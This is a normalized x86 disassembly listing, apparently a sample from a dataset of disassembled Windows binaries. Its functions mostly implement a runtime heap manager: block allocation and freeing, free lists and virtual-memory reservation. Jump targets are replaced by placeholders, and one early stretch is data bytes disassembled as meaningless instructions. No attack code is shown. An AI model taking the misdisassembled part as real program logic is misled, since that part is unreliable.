sub_401143
dec esp
add [ esp + 0x4 ] 0xfffffff8
jmp r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4031dc
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_401165
inc ebp
adc [ eax ] eax
dec edi
adc [ eax ] eax
pop ecx
adc [ eax ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
adc [ gs : eax ] eax
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
adc [ eax ] eax
or al 0x0
add [ eax ] al
mov al [ 0x70004010 ]
xor eax [ eax ]
xor al 0x55
inc eax
add [ eax + 0x55 ] al
inc eax
add [ ebx + esi + 0x33780040 ] al
inc eax
add [ eax + 0x55 ] dl
inc eax
add ah bl
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ ecx ] dl
push esp
dec ecx
outsb
je r-xdata
inc eax
add [ ecx + 0x11 ] dh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sar bh 0x25
jb r-xdata
mov ah 0xd1
inc esi
add [ ebx - 0x4fda0040 ] cl
rol [ esi ] 0x1
mov eax eax
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
sub_401370
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call sub_401330
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_4013c8
push ebx
push esi
mov esi edx
mov ebx eax
call sub_401370
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_401410
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
add eax [ esi + 0x4 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax ebx
call sub_4013f8
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_4013f8
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ esi ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jne r-xdata
mov edx esi
mov eax ebp
call sub_4013c8
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_401480
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx esi
mov edi [ edx + 0x4 ]
add ecx edi
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
mov edi [ ebx + 0x8 ]
add edi [ ebx + 0xc ]
sub edi ecx
mov [ esp + 0x4 ] edi
sub esi eax
mov [ ebx + 0xc ] esi
mov edx esp
mov eax ebx
call sub_4013c8
test al al
jne r-xdata
sub [ ebx + 0xc ] edi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_4013f8
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_401514
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013c8
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call sub_401340
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call sub_401348
xor eax eax
mov [ ebx ] eax
sub_401578
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call sub_401340
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call sub_401340
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013c8
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call sub_401348
xor eax eax
mov [ ebx ] eax
sub_4015f0
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call sub_401348
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_4013f8
mov [ rw-data ] 0x1
sub_4016a8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call sub_401340
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_40173c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call sub_401348
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_4017bc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_401514
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_4016a8
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_401410
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_4015f0
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_4013f8
jmp r-xdata
sub_40184c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_401578
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401410
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_401578
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_4015f0
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401410
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_4016a8
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_4015f0
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_4013f8
jmp r-xdata
sub_401970
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_40173c
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_401410
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_4015f0
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_401480
jmp r-xdata
sub_4019fc
push ebp
mov ebp esp
xor edx edx
push ebp
push sub_401ab2
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call sub_401350
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_4013c0
mov eax rw-data
call sub_4013c0
mov eax rw-data
call sub_4013c0
push 0xff8
push 0x0
call sub_401330
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_401358
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401ab9
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call sub_401360
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_401ac0
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push sub_401b96
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call sub_401358
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call sub_401348
mov ebx [ ebx ]
mov eax rw-data
call sub_4013c0
mov eax rw-data
call sub_4013c0
mov eax rw-data
call sub_4013c0
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_401368
retn
push rw-data
call sub_401360
sub_401ba0
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_401c04
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_401c34
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_401e08
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_401c88
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_401c64
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_401cb0
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_401ba0
add ebx esi
mov [ rw-data ] 0x6
sub_401d20
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_401ba0
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_401d58
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov [ esp ] 0x0
mov eax esi
call sub_401c04
mov ebx eax
test ebx ebx
je r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
lea ecx [ esp + 0x1 ]
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_401970
lea ecx [ esp + 0x1 ]
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_401970
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_401c34
mov eax ebp
add eax [ esp + 0x5 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
mov ebp [ esp + 0x1 ]
test ebp ebp
je r-xdata
lea edx [ esp + 0x1 ]
mov eax ebx
call sub_401480
mov [ esp ] 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_401c88
sub_401e08
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_401d58
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_401e90
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_401c64
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_401edc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
call sub_401e90
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_401410
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_401cb0
sub [ edi ] eax
add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_401d20
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_401c34
sub [ edi + 0x4 ] 0x4
sub_401f68
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_4017bc
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401edc
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_401f94
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_40184c
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401edc
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_401fc8
xor edx edx
test eax eax
jns r-xdata
sar eax 0x2
cmp eax 0x400
jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_401ff4
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_401ba0
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_401e08
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_401f68
test al al
jne r-xdata
mov eax esi
call sub_401fc8
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_4020e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x7ffffff8
jle r-xdata
call sub_4019fc
test al al
je r-xdata
xor ecx ecx
push ebp
push sub_402264
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call sub_401358
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
mov eax ebx
call sub_401ff4
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call sub_401360
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403960
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
mov ecx ebx
test ecx ecx
jns r-xdata
mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403960
jmp r-xdata
sub_402278
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_40240a
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_4019fc
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call sub_401358
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
and ebx 0x7ffffffc
mov eax esi
add eax ebx
mov edi eax
cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call sub_401360
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_403960
jmp r-xdata
call sub_401e90
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_401ba0
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_401e08
mov edx [ eax + 0x8 ]
add ebx edx
